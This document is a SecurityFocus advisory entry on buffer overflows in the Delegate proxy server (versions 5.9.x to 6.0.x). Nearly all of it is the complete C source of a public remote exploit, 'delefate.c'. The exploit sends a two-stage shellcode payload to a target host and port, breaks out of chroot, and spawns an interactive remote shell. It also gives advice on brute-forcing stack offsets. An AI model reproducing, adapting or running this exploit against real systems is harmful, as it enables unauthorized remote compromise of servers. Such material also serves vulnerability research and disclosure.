source: http://www.securityfocus.com/bid/808/info

The Delegate proxy server from ElectroTechnical Laboratory has numerous (several hundred, according to the orignal poster) unchecked buffers that could be exploited to remotely compromise the server.

/* delefate.c
 * delegate 5.9.x - 6.0.x remote exploit
 *
 * public
 *
 * will open a shell with the privileges of the nobody user.
 *
 * 1999/13/11 by scut of teso [http://teso.scene.at/]
 *
 * word to whole team teso, ADM, w00w00, beavuh and stealth :).
 * special thanks to xdr for donating a bit of his elite debugging skillz.
 */

#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <netdb.h>


#define	XP_OFFSET		0xbfffe074	/* offset */
unsigned long int		xp_off = XP_OFFSET;

/* you don't have to modify this :) i hope :)
 */
#define	XP_NETWORK_FD		12
#define	XP_NETWORK_OFFSET	0x00000101	/* fixed relative network socket offset */
#define	XP_SHELLCODE_OFFSET	0x00000104	/* fixed relative retaddr offset */
#define	XP_DIFF			0x0000000e	/* 14 bytes after XP_OFFSET starts the shellcode */

#define	XP_SH2_FD1		0x00000011
#define	XP_SH2_FD2		0x0000001d
#define	XP_SH2_FD3		0x0000002a


#define	GREEN	"\E[32m"
#define	BOLD	"\E[1m"
#define	NORMAL	"\E[m"
#define	RED	"\E[31m"

/* local functions
 */
void			usage (void);
void			shell (int socket);
unsigned long int	net_resolve (char *host);
int			net_connect (struct sockaddr_in *cs, char *server,
	unsigned short int port, int sec);


/* because the buffer is rather small (256 bytes), we use a minimalistic
 * read() shellcode to increase the chances to hit a correct offet
 */
unsigned char	shellcode1[] =
	"\x77\x68\x6f\x69\x73\x3a\x2f\x2f\x61\x20\x62\x20\x31\x20\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90"

	/* 30 byte read() shellcode by scut */
	"\x33\xd2\x33\xc0\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x80\xc2"
	"\x10\x03\xca\xc1\xc2\x04\xb0\x03\x33\xdb\xb3\x0c\xcd\x80"
						/*     ^^ network fd */
	"\x82\xe0\xff\xbf"	/* return address */

	"\x0d\x0a";


/* uid+chroot-break+shell shellcode by lamerz, thanks !
 * slightly modified by scut to take care of the network socket
 */
unsigned char shellcode2[]=
	"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb\x89\xd9"
	"\xb3\x0c\xb0\x3f\xcd\x80\x31\xc0\x31\xdb\x89\xd9\xb3\x0c\x41\xb0"
	"\x3f\xcd\x80\x31\xc0\x31\xdb\x89\xd9\xb3\x0c\x41\x41\xb0\x3f\xcd"
	"\x80\x31\xc0\x31\xdb\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e"
	"\x31\xc0\x31\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\x01\xb0\x27"
	"\xcd\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d"
	"\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0\x0c"
	"\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09\x8d\x5e\x08\xb0\x3d"
	"\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8\x88\x46\x04\x31\xc0\x88\x46\x07"
	"\x89\x76\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b"
	"\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\x30"
	"\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31\x76\x6e\x67";


void
usage (void)
{
	printf (GREEN BOLD "delefate - delegate 5.9.x, 6.0.x remote" NORMAL "\n"
		"by " BOLD "scut" NORMAL " of " RED BOLD "team teso" NORMAL "\n\n"

		"usage.... : ./delefate <host> <port> [offset-add]\n"
		"example.. : ./delefate localhost 8080 -100\n\n"
		"for brute forcing, try from -2000 to 500 in steps of 200\n\n");

	exit (EXIT_FAILURE);
}

int
main (int argc, char **argv)
{
	int			socket;
	char			*server;
	struct sockaddr_in	sa;
	unsigned short int	port_dest;
	unsigned char		*retaddr_ptr;
	unsigned long int	offset;
	unsigned char		*stack = NULL;

	if (argc < 3)
		usage ();

	printf (GREEN BOLD "delefate 5.9.x - 6.0.x remote exploit" NORMAL "\n"
		"by " BOLD "scut" NORMAL " of " RED BOLD "team teso" NORMAL "\n\n");

	if (argc == 4) {
		long int	xp_add = 0;

		if (sscanf (argv[3], "%ld", &xp_add) != 1) {
			usage ();
		}
		xp_off += xp_add;
	}
	printf (" " GREEN "-" NORMAL " using offset 0x%08x\n", xp_off);

	server = argv[1];
	port_dest = atoi (argv[2]);

	/* do the offset
	 */
	retaddr_ptr = shellcode1 + XP_SHELLCODE_OFFSET;
	offset = xp_off + XP_DIFF;
	*retaddr_ptr				= (offset & 0x000000ff) >>  0;
	*(retaddr_ptr + 1)			= (offset & 0x0000ff00) >>  8;
	*(retaddr_ptr + 2)			= (offset & 0x00ff0000) >> 16;
	*(retaddr_ptr + 3)			= (offset & 0xff000000) >> 24;
	*(shellcode1 + XP_NETWORK_OFFSET)	= (unsigned char) XP_NETWORK_FD;
	*(shellcode2 + XP_SH2_FD1)		= (unsigned char) XP_NETWORK_FD;
	*(shellcode2 + XP_SH2_FD2)		= (unsigned char) XP_NETWORK_FD;
	*(shellcode2 + XP_SH2_FD3)		= (unsigned char) XP_NETWORK_FD;

	printf (" " GREEN "-" NORMAL " connecting to " GREEN "%s:%hu" NORMAL "...", server, port_dest);
	fflush (stdout);

	socket = net_connect (&sa, server, port_dest, 45);
	if (socket <= 0) {
		printf (" " RED BOLD "failed" NORMAL ".\n");
		perror ("net_connect");
		exit (EXIT_FAILURE);
	}
	printf (" " GREEN BOLD "connected." NORMAL "\n");

	/* send minimalistic read() shellcode */
	printf (" " GREEN "-" NORMAL " sending first shellcode...\n");
	write (socket, shellcode1, strlen (shellcode1));
	sleep (1);

	/* now send the real shellcode :-) */
	printf (" " GREEN "-" NORMAL " sending second shellcode...\n");
	write (socket, shellcode2, strlen (shellcode2));

	printf (" " GREEN "-" NORMAL " spawning shell...\n\n");
	shell (socket);
	close (socket);


	exit (EXIT_SUCCESS);
}

unsigned long int
net_resolve (char *host)
{
	long		i;
	struct hostent	*he;

	i = inet_addr (host);
	if (i == -1) {
		he = gethostbyname (host);
		if (he == NULL) {
			return (0);
		} else {
			return (*(unsigned long *) he->h_addr);
		}
	}

	return (i);
}


/* original version by typo, modified by scut
 */

void
shell (int socket)
{
	char	io_buf[1024];
	int	n;
	fd_set	fds;

	while (1) {
		FD_SET (0, &fds);
		FD_SET (socket, &fds);

		select (socket + 1, &fds, NULL, NULL, NULL);
		if (FD_ISSET (0, &fds)) {
			n = read (0, io_buf, sizeof (io_buf));
			if (n <= 0)
				return;
			write (socket, io_buf, n);
		}

		if (FD_ISSET (socket, &fds)) {
			n = read (socket, io_buf, sizeof (io_buf));
			if (n <= 0)
				return;
			write (1, io_buf, n);
		}
	}
}


int
net_connect (struct sockaddr_in *cs, char *server,
	unsigned short int port, int sec)
{
	int		n, len, error, flags;
	int		fd;
	struct timeval	tv;
	fd_set		rset, wset;

	/* first allocate a socket */
	cs->sin_family = AF_INET;
	cs->sin_port = htons (port);
	fd = socket (cs->sin_family, SOCK_STREAM, 0);
	if (fd == -1)
		return (-1);

	cs->sin_addr.s_addr = net_resolve (server);
	if (cs->sin_addr.s_addr == 0) {
		close (fd);
		return (-1);
	}

	flags = fcntl (fd, F_GETFL, 0);
	if (flags == -1) {
		close (fd);
		return (-1);
	}
	n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);
	if (n == -1) {
		close (fd);
		return (-1);
	}

	error = 0;

	n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));
	if (n < 0) {
		if (errno != EINPROGRESS) {
			close (fd);
			return (-1);
		}
	}
	if (n == 0)
		goto done;

	FD_ZERO(&rset);
	FD_ZERO(&wset);
	FD_SET(fd, &rset);
	FD_SET(fd, &wset);
	tv.tv_sec = sec;
	tv.tv_usec = 0;

	n = select(fd + 1, &rset, &wset, NULL, &tv);
	if (n == 0) {
		close(fd);
		errno = ETIMEDOUT;
		return (-1);
	}
	if (n == -1)
		return (-1);

	if (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {
		if (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {
			len = sizeof(error);
			if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
				errno = ETIMEDOUT;
				return (-1);
			}
			if (error == 0) {
				goto done;
			} else {
				errno = error;
				return (-1);
			}
		}
	} else
		return (-1);

done:
	n = fcntl(fd, F_SETFL, flags);
	if (n == -1)
		return (-1);

	return (fd);
}
